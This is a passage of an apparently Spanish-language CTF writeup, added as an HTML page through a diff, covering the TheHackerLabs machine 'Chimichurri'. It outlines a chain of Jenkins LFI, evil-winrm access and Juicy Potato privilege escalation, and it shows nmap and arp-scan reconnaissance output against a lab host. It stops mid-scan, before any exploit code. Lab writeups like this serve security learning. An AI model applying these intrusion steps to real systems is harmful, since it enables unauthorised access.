@@ -1,0 +1,1401 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chimichurri - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-chimichurri/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Chimichurri - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-chimichurri/Chimichurri.jpg">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-cocidoAndaluz/">
+          <span class="side-post-card-title">Cocido Andaluz</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-mortadela/">
+          <span class="side-post-card-title">Mortadela</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Chimichurri</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-Bridgenton/">
+          <span class="side-post-card-title">Bridgenton</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-fruits/">
+          <span class="side-post-card-title">Fruits</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Easy Machine</div>
+    
+    <h1>Chimichurri - TheHackerLabs</h1>
+    <div class="post-meta">23 January 2025 · 21 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-chimichurri/Chimichurri.jpg" alt="Chimichurri - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Una máquina un poco difícil en cuanto a la intrusión, ya que si no sigues las pistas, puedes perderte. En los escaneos, identificamos que estamos contra un Directorio Activo e identificamos un servidor Jenkins. Enumeramos algunos servicios y el servidor Jenkins, antes de llegar al servicio SMB. Después de enumerar el servicio SMB, encontramos un archivo que contiene el nombre de un usuario y la pista en donde se encuentra su contraseña. Usando un Exploit dirigido a Jenkins, podemos aplicar LFI y con esto, logramos obtener la contraseña del usuario encontrado. Conectándonos a la máquina víctima con evil-winrm, identificamos que nuestro usuario tiene el privilegio SeImpersonatePrivilege, lo que nos permite usar Juicy Potato para escalar privilegios y convertirnos en Administrador. El problema es que no podremos ver las flags, a menos que cambiemos la contraseña del Administrador.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>whatweb</code></li><li><code>dig</code></li><li><code>crackmapexec</code></li><li><code>smbclient</code></li><li><code>kerbrute</code></li><li><code>smbmap</code></li><li><code>searchsploit</code></li><li><code>python3</code></li><li><code>evil-winrm</code></li><li><code>impacket-GetNPUsers</code></li><li><code>impacket-GetUserSPNs</code></li><li><code>whoami</code></li><li><code>JuicyPotato.exe</code></li><li><code>msfvenom</code></li><li><code>rlwrap</code></li><li><code>nc</code></li><li><code>net user</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#DNS">Analizando Servicio DNS</a></li>
+        <li><a href="#Jenkins">Analizando Servidor Jenkins</a></li>
+        <li><a href="#SMB">Enumeración de Servicio SMB</a></li>
+        <li><a href="#Kerberos">Enumeración de Servicio Kerberos</a>
+          <ul>
+            <li><a href="#SMBMAP">Enumeración de Servicio SMB con smbmap</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#JenkinsExploit">Probando Exploit: Jenkins 2.441 - Local File Inclusion y Ganando Acceso a la Máquina</a></li>
+        <li><a href="#KerberosAttacks">Opcional: Aplicando AS-REP Roasting Attack y Kerberoasting Attack (Ambos Fallan)</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#JuicyPotato">Escalando Privilegios con Juicy Potato</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#DNS">Analizando Servicio DNS</a></li>
+        <li><a href="#Jenkins">Analizando Servidor Jenkins</a></li>
+        <li><a href="#SMB">Enumeración de Servicio SMB</a></li>
+        <li><a href="#Kerberos">Enumeración de Servicio Kerberos</a>
+          <ul>
+            <li><a href="#SMBMAP">Enumeración de Servicio SMB con smbmap</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#JenkinsExploit">Probando Exploit: Jenkins 2.441 - Local File Inclusion y Ganando Acceso a la Máquina</a></li>
+        <li><a href="#KerberosAttacks">Opcional: Aplicando AS-REP Roasting Attack y Kerberoasting Attack (Ambos Fallan)</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#JuicyPotato">Escalando Privilegios con Juicy Potato</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Hosts">Descubrimiento de Hosts</h3>
+<p>Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.</p>
+<p>Lo haremos primero con <strong>nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 192.168.1.0/24
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-23 13:34 CST
+</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.50
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0010s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> Tu_IP
+</span></span><span style="display:flex;"><span>Host is up.
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> hosts up<span style="color:#f92672">)</span> scanned in 2.89 seconds
+</span></span></code></pre></div><p>Vamos a probar la herramienta <strong>arp-scan</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth0 -g 192.168.1.0/24
+</span></span><span style="display:flex;"><span>Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
+</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>192.168.1.50   XX       PCS Systemtechnik GmbH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.165 seconds <span style="color:#f92672">(</span>118.24 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">3</span> responded
+</span></span></code></pre></div><p>Encontramos nuestro objetivo y es: <code>192.168.1.50</code></p>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.1.50
+</span></span><span style="display:flex;"><span>PING 192.168.1.50 <span style="color:#f92672">(</span>192.168.1.50<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.50: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>1.80 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.50: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.741 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.50: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.624 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.50: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.812 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.1.50 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3058ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.624/0.993/1.797/0.468 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Windows</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.1.50 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-23 13:34 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 13:34
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.50 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 13:34, 0.13s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 13:34
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.50 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 53/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 88/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 5985/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 3268/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 49667/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 9389/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 49664/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 6969/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 464/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 49665/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 65137/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 47001/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 3269/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 49694/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 49672/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 49675/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 593/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 49666/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 192.168.1.50 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span> due to max_successful_tryno increase to <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Discovered open port 49669/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 49670/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Discovered open port 389/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 192.168.1.50 from <span style="color:#ae81ff">5</span> to <span style="color:#ae81ff">10</span> due to max_successful_tryno increase to <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>Discovered open port 636/tcp on 192.168.1.50
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 192.168.1.50 from <span style="color:#ae81ff">10</span> to <span style="color:#ae81ff">20</span> due to max_successful_tryno increase to <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 13:35, 61.03s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.50
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00078s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-01-23 13:34:51 CST <span style="color:#66d9ef">for</span> 61s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65510</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE          REASON
+</span></span><span style="display:flex;"><span>53/tcp    open  domain           syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec     syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap             syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds     syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5         syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap   syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP    syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>6969/tcp  open  acmsoda          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws             syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>47001/tcp open  winrm            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49664/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49665/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49666/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49667/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49669/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49670/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49672/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49675/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49694/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>65137/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 61.33 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">201553</span> <span style="color:#f92672">(</span>8.868MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65540</span> <span style="color:#f92672">(</span>2.622MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Veo varios puertos que me indican que estamos contra un <strong>Active Directory</strong>, por ejemplo, el <strong>puerto 88</strong> que es el <strong>servicio Kerberos</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49667,49669,49670,49672,49675,49694,65137 192.168.1.50 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-23 13:36 CST
+</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+</span></span><span style="display:flex;"><span>Stats: 0:00:49 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 64.00% <span style="color:#66d9ef">done</span>; ETC: 13:37 <span style="color:#f92672">(</span>0:00:28 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.50
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00059s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-01-23 18:26:33Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: chimichurri.thl, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: chimichurri.thl, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
